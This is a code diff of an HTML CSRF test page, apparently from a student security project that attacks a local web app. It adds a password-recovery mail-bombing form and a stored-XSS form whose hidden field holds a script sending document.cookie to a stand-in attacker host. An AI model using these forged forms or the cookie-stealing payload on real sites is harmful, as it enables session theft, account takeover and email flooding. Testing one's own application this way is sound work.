@@ -53,27 +53,41 @@
             <p>It exploits the recovery session to force a permanent password change by setting the attacker's credentials without a valid CSRF token.</p>
             
             <form id="csrfFormReset" action="http://localhost/reset_password.php" method="POST" target="_blank">
-                <input type="hidden" name="token" value="d3f4b23a8e7182cfbc93aef4312894aef81923481023cdab8e19284371fa823d" />
+                <input type="hidden" name="token" value="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" />
                 <input type="hidden" name="password_new" value="AttackerPassword2026!" />
                 <input type="hidden" name="password_confirm" value="AttackerPassword2026!" />
                 <button type="submit" class="btn-attack">Launch Password Reset Attack</button>
             </form>
         </div>
-
+        
         <div class="test-card">
-            <h3>Scenario 4: Unauthorized Media Upload</h3>
-            <p><strong>Target:</strong> <code>upload.php</code> (Method: POST + Multipart)</p>
-            <p>Attempts to force upload metadata and records to the media database on behalf of the logged in user, bypassing the integrity check.</p>
-            
-            <form id="csrfFormUpload" action="http://localhost/upload.php" method="POST" enctype="multipart/form-data" target="_blank">
-                <input type="hidden" name="upload_type" value="audio" />
-                <input type="hidden" name="title" value="Fake CSRF Track" />
-                <input type="hidden" name="author" value="Attacker" />
-                <input type="hidden" name="MAX_FILE_SIZE" value="10485760" />
-                <input type="hidden" name="is_premium" value="1" />
-                <button type="submit" class="btn-attack">Launch Media Upload Attack</button>
-            </form>
-        </div>
+	    <h3>Scenario 4: Password Recovery Flooding (Mail Bombing)</h3>
+	    <p><strong>Target:</strong> <code>forgot_password.php</code> (Method: POST)</p>
+	    <p>Attempts to abuse the recovery service from a third-party origin to trigger unauthorized password reset emails (Mail Bombing/DoS) without a valid CSRF token.</p>
+	    
+	    <form id="csrfFormForgot" action="http://localhost/forgot_password.php" method="POST" target="_blank">
+		<input type="hidden" name="email" value="project_snh_26_user@libero.it" />
+		
+		<button type="submit" class="btn-attack">Launch Recovery Password Mail Attack</button>
+	    </form>
+	</div>
+
+        <<div class="test-card">
+	    <h3>Scenario 5: Unauthorized Lyrics Ingestion (Stored XSS Attempt)</h3>
+	    <p><strong>Target:</strong> <code>upload.php</code> (Method: POST)</p>
+	    <p>Attempts to force the ingestion of a new song text containing a malicious JavaScript payload (Stored XSS) on behalf of the logged-in user, bypassing token verification.</p>
+	    
+	    <form id="csrfFormUploadLyrics" action="http://localhost/upload.php" method="POST" target="_blank">
+		<input type="hidden" name="upload_type" value="lyrics" />
+		<input type="hidden" name="title" value="CSRF Exploit Song" />
+		<input type="hidden" name="author" value="Malicious Attacker" />
+		
+		<input type="hidden" name="content" value="<script>fetch('http://attacker-server.com/steal?cookie=' + document.cookie);</script> Beautiful song lyrics here..." />
+		
+		<input type="hidden" name="is_premium" value="0" />
+		<button type="submit" class="btn-attack">Launch Lyrics CSRF Attack</button>
+	    </form>
+	</div>
 
     </div>
 
